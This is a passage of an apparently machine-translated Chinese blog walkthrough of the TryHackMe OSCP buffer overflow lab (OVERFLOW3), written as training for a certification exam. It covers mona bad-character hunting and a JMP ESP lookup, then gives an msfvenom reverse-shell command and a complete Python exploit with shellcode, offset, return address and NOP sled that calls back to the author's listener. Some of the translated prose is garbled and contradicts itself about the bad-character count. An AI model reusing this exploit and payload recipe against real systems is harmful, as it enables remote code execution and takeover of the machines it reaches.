kp gt kq gh gi paragraph-image"><div class="gh gi pf"><img src="../Images/aead962c22b7c90c7429126a2b658f64.png" data-original-src="https://miro.medium.com/v2/resize:fit:1346/format:webp/1*kH3tqrAYD3VHA0aHL5wH6w.png"/></div></figure><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="2133" class="ky kz iq ny b gy oc od l oe of">!mona compare -f C:\mona\oscp\bytearray.bin -a 0088FA28</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pg"><img src="../Images/0645330fc96134c1502e210a39121bda.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/format:webp/1*sZNDj_rw4tpZfizlwdC4ig.png"/></div></figure><p id="b8e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">同样，x40是一个坏字符，x41不是。</p><p id="60f9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们只有两个明显的bad char \ x5f \ X60 \ xb8 \ xb9 \ xee \ xef</p><p id="2db0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开始豁免oscp.exe</p><p id="ce40" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我创建了一个新的bytearray，并从有效负载中删除了\x5f</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="190b" class="ky kz iq ny b gy oc od l oe of">!mona bytearray -b "\x00\x11\x40\x5f"</span></pre><p id="3dc2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行服务器</p><p id="9892" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编辑exploit.py从有效负载变量中移除\x5f并运行exploit.py</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi os"><img src="../Images/a9c0374f014e76e194f4176e46331c2a.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/0*X6FL1kBbpEIV72kl.png"/></div></figure><p id="8fcd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查ESP指针值</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pf"><img src="../Images/465a9d7ad883e037f6167816be63c455.png" data-original-src="https://miro.medium.com/v2/resize:fit:1346/format:webp/1*XRcfRsU7lhYSu7vaCYdxbQ.png"/></div></figure><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="255f" class="ky kz iq ny b gy oc od l oe of">!mona compare -f C:\mona\oscp\bytearray.bin -a 00BDFA28</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ph"><img src="../Images/fd8a63c10beac49dbd0c97be201088eb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1212/format:webp/1*Ql85TvANG0r08cdhPgGFRw.png"/></div></figure><p id="c237" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">同样，x5f是一个BADCHAR，x60不是。</p><p id="2bca" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们只有两个明显的错误</p><p id="02c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开始豁免oscp.exe</p><p id="b935" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我创建了一个新的bytearray，并从有效负载中删除了\xb8</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="b665" class="ky kz iq ny b gy oc od l oe of">!mona bytearray -b "\x00\x11\x40\x5f\xb8"</span></pre><p id="467b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行服务器</p><p id="0062" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编辑exploit.py从有效负载变量中移除\xb8并运行exploit.py</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi os"><img src="../Images/a9c0374f014e76e194f4176e46331c2a.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/0*X6FL1kBbpEIV72kl.png"/></div></figure><p id="444d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查ESP指针值</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/70f73629324b9a6f782d483edc35a6dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1348/format:webp/1*Ok_jU8u1LQnm8QsX9cC88A.png"/></div></figure><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="53bd" class="ky kz iq ny b gy oc od l oe of">!mona compare -f C:\mona\oscp\bytearray.bin -a 008DFA28</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pj"><img src="../Images/2a03db76dd82ce5e071925a8dd230a36.png" data-original-src="https://miro.medium.com/v2/resize:fit:1190/format:webp/1*-_6GWVya63qH-0qggnA7sA.png"/></div></figure><p id="eca4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">同样，xb8是一个坏字符，xb9不是。</p><p id="c28d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们只有两个明显的坏蛋</p><p id="3037" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开始豁免oscp.exe</p><p id="f9b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我创建了一个新的bytearray，并从有效负载中删除了\xee</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="7848" class="ky kz iq ny b gy oc od l oe of">!mona bytearray -b "\x00\x11\x40\x5f\xb8\xee"</span></pre><p id="8cf1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行服务器</p><p id="60ce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">编辑exploit.py从有效负载变量中删除并运行exploit.py</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi os"><img src="../Images/a9c0374f014e76e194f4176e46331c2a.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/0*X6FL1kBbpEIV72kl.png"/></div></figure><p id="cf2d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查ESP指针值</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/36e59253e0b04444d518fc64ba572618.png" data-original-src="https://miro.medium.com/v2/resize:fit:1340/format:webp/1*HMDrAH62DsukmFmScWNSiw.png"/></div></figure><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="c1b7" class="ky kz iq ny b gy oc od l oe of">!mona compare -f C:\mona\oscp\bytearray.bin -a 0085FA28</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi pk"><img src="../Images/d87314626adda480408443536b7bcc5a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zhMTR21f-6eVyEbbTuceOg.png"/></div></div></figure><p id="be5a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这之后！我们启动它并在MONA中运行比较，我们发现地址现在未被修改。嘣，我们终于有了坏蛋</p><p id="5d39" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">未修改就得到错误，试错之后，序列是这样的。</p><p id="4c4e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">绿框表示正确的坏字符，让我们再次使用mona命令找到跳转点:</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="613b" class="ky kz iq ny b gy oc od l oe of">!mona jmp -r esp -cpb “\x00\x11\x40\x5f\xb8\xee”</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pl"><img src="../Images/b93d4031b72735fcfa38ebf9f3382c4f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YaCXHyWK5N-i9E5JwqNpLQ.png"/></div></figure><p id="6476" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">上述结果中的任何地址都可能被用作漏洞利用中的retn值。小端=反。还要添加填充以允许有效载荷打开包装。</p><p id="2bad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意地址<strong class="jp ir"> 62501203 </strong></p><blockquote class="pm pn po"><p id="4e33" class="jn jo pp jp b jq jr js jt ju jv jw jx pq jz ka kb pr kd ke kf ps kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="iq">注意:-如果</em> 62501203 <em class="iq">没有为反向外壳创建完美的paylaod，则更改地址，直到获得反向外壳</em> </strong></p></blockquote><p id="8b7b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用新地址更新我们的retn变量，并且必须向后写(因为系统是little-endian=Reverse)。</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="7c5f" class="ky kz iq ny b gy oc od l oe of">retn = "\x03\x12\x50\x62"<br/>padding = "\x90" * 16</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pt"><img src="../Images/ae7246147882ecc1f229853c86b479a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:996/format:webp/1*HIO-jbrMLPG4gwyEa26Prw.png"/></div></figure><p id="cacc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在使用msfvenom生成反向shell有效负载。</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="a6e8" class="ky kz iq ny b gy oc od l oe of">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.73 LPORT=4444 EXITFUNC=thread -b “\x00\x11\x40\x5f\xb8\xee” -f c</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi pu"><img src="../Images/b2de7371986e85333cdd23b666f78726.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eMbmP4PfzuuH87FbSfTLKA.png"/></div></div></figure><p id="af75" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将有效负载复制到exploit.py中，并将有效负载变量设置为buf。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi pv"><img src="../Images/1b4af5fdb12342662750a738c0fefd7f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5_0TV8Ej9gS4ndz9rbNUug.png"/></div></div></figure><p id="88c4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以最后的有效载荷是我的卡莉</p><pre class="km kn ko kp gt nx ny nz oa aw ob bi"><span id="920b" class="ky kz iq ny b gy oc od l oe of">import socket</span><span id="590a" class="ky kz iq ny b gy oh od l oe of">ip = "192.168.43.57"<br/>port = 1337<br/>buf = b""<br/>buf += b"\xfc\xbb\xc3\x62\xa9\xe4\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"<br/>buf += b"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x3f\x8a\x2b\xe4\xbf"<br/>buf += b"\x4b\x4c\x6c\x5a\x7a\x4c\x0a\x2f\x2d\x7c\x58\x7d\xc2\xf7\x0c"<br/>buf += b"\x95\x51\x75\x99\x9a\xd2\x30\xff\x95\xe3\x69\xc3\xb4\x67\x70"<br/>buf += b"\x10\x16\x59\xbb\x65\x57\x9e\xa6\x84\x05\x77\xac\x3b\xb9\xfc"<br/>buf += b"\xf8\x87\x32\x4e\xec\x8f\xa7\x07\x0f\xa1\x76\x13\x56\x61\x79"<br/>buf += b"\xf0\xe2\x28\x61\x15\xce\xe3\x1a\xed\xa4\xf5\xca\x3f\x44\x59"<br/>buf += b"\x33\xf0\xb7\xa3\x74\x37\x28\xd6\x8c\x4b\xd5\xe1\x4b\x31\x01"<br/>buf += b"\x67\x4f\x91\xc2\xdf\xab\x23\x06\xb9\x38\x2f\xe3\xcd\x66\x2c"<br/>buf += b"\xf2\x02\x1d\x48\x7f\xa5\xf1\xd8\x3b\x82\xd5\x81\x98\xab\x4c"<br/>buf += b"\x6c\x4e\xd3\x8e\xcf\x2f\x71\xc5\xe2\x24\x08\x84\x6a\x88\x21"<br/>buf += b"\x36\x6b\x86\x32\x45\x59\x09\xe9\xc1\xd1\xc2\x37\x16\x15\xf9"<br/>buf += b"\x80\x88\xe8\x02\xf1\x81\x2e\x56\xa1\xb9\x87\xd7\x2a\x39\x27"<br/>buf += b"\x02\xfc\x69\x87\xfd\xbd\xd9\x67\xae\x55\x33\x68\x91\x46\x3c"<br/>buf += b"\xa2\xba\xed\xc7\x25\x05\x59\xec\xfc\xed\x98\xf2\xef\xb1\x15"<br/>buf += b"\x14\x65\x5a\x70\x8f\x12\xc3\xd9\x5b\x82\x0c\xf4\x26\x84\x87"<br/>buf += b"\xfb\xd7\x4b\x60\x71\xcb\x3c\x80\xcc\xb1\xeb\x9f\xfa\xdd\x70"<br/>buf += b"\x0d\x61\x1d\xfe\x2e\x3e\x4a\x57\x80\x37\x1e\x45\xbb\xe1\x3c"<br/>buf += b"\x94\x5d\xc9\x84\x43\x9e\xd4\x05\x01\x9a\xf2\x15\xdf\x23\xbf"<br/>buf += b"\x41\x8f\x75\x69\x3f\x69\x2c\xdb\xe9\x23\x83\xb5\x7d\xb5\xef"<br/>buf += b"\x05\xfb\xba\x25\xf0\xe3\x0b\x90\x45\x1c\xa3\x74\x42\x65\xd9"<br/>buf += b"\xe4\xad\xbc\x59\x04\x4c\x14\x94\xad\xc9\xfd\x15\xb0\xe9\x28"<br/>buf += b"\x59\xcd\x69\xd8\x22\x2a\x71\xa9\x27\x76\x35\x42\x5a\xe7\xd0"<br/>buf += b"\x64\xc9\x08\xf1\x64\xed\xf6\xfa"<br/>prefix = "OVERFLOW3 "<br/>offset = 1274<br/>overflow = "A" * offset<br/>retn = "\x03\x12\x50\x62"<br/>padding = "\x90" * 16<br/>payload = buf</span><span id="39dc" class="ky kz iq ny b gy oh od l oe of">postfix = ""</span><span id="783a" class="ky kz iq ny b gy oh od l oe of">buffer = prefix + overflow + retn + padding + payload + postfix</span><span id="f9cb" class="ky kz iq ny b gy oh od l oe of">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><span id="4bad" class="ky kz iq ny b gy oh od l oe of">try:<br/>  s.connect((ip, port))<br/>  print("Sending evil buffer...")<br/>  s.send(buffer + "\r\n")<br/>  print("Done!")<br/>except:<br/>  print("Could not connect.")</span></pre><p id="0d9f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用netcat启动一个监听器</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pw"><img src="../Images/22ba3a70971ae85119c69b019469eb0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:666/format:webp/0*kYWVmaZZX_GMnUwl.png"/></div></figure><p id="c606" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">再次启动易受攻击的应用程序。执行exploit.py现在回头看netcat。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi os"><img src="../Images/09ad4ebc16d96c385fb95f819988cfa5.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/0*1lLieOPuuW5J5q8w.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi px"><img src="../Images/d02218684486840c4d3e9dba0338813c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1314/format:webp/0*X-SBytbAX2IvW206.png"/></div></figure><p id="96fc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以在:<br/><strong class="jp ir">LinkedIn:-</strong><a class="ae kx" href="https://www.linkedin.com/in/shamsher-khan-651a35162/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/shamsher-khan-651a35162/</a><br/><strong class="jp ir">Twitter:-</strong><a class="ae kx" href="https://twitter.com/shamsherkhannn" rel="noopener ugc nofollow" target="_blank">https://twitter.com/shamsherkhannn</a><br/><strong class="jp ir">Tryhackme:-</strong><a class="ae kx" href="https://tryhackme.com/p/Shamsher" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/p/Shamsher</a></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi py"><img src="../Images/da6f9cf41dd048a1c34acbf12be9daa8.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/0*uw8X_21bVBOVP-Fo.png"/></div></figure><p id="8550" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如需更多演练，请在出发前继续关注…<br/>…</p><p id="2a26" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">点击此处加入电报</strong><br/><a class="ae kx" href="https://t.me/tryhackme_writeups" rel="noopener ugc nofollow" target="_blank">https://t.me/tryhackme_writeups</a></p><p id="02e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">访问我的其他演练:-</p><div class="lw lx gp gr ly lz"><a href="https://shamsher-khan-404.medium.com/tryhackme-oscp-buffer-overflow-prep-overflow-1-19e000482f27" rel="noopener follow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">TryHackMe: OSCP缓冲区溢出准备(溢出1)</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">Shamsher khan练习基于堆栈的缓冲区溢出！为了OSCP</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">shamsher-khan-404.medium.com</p></div></div><div class="mi l"><div class="pz l mk ml mm mi mn kv lz"/></div></div></a></div><div class="lw lx gp gr ly lz"><a href="https://shamsher-khan-404.medium.com/tryhackme-oscp-buffer-overflow-prep-overflow-2-57c22b51a91f" rel="noopener follow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">TryHackMe: OSCP缓冲区溢出准备(溢出2)</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">Shamsher khan练习基于堆栈的缓冲区溢出！为了OSCP</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">shamsher-khan-404.medium.com</p></div></div><div class="mi l"><div class="qa l mk ml mm mi mn kv lz"/></div></div></a></div><div class="lw lx gp gr ly lz"><a href="https://shamsher-khan-404.medium.com/stack-based-buffer-overflow-practical-for-windows-vulnserver-8d2be7321af5" rel="noopener follow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">基于堆栈的缓冲区溢出实用程序(Vulnserver)</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">Shamsher Khan利用TRUN命令攻击vulnserver缓冲区溢出</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">shamsher-khan-404.medium.com</p></div></div><div class="mi l"><div class="qb l mk ml mm mi mn kv lz"/></div></div></a></div><p id="8f3f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢您花时间阅读我的演练。<br/>如果你觉得有用，请点击👏按钮👏(高达40倍)并分享<br/>它来帮助其他有类似兴趣的人！+随时欢迎反馈！</p></div></div>    
</body>
</html>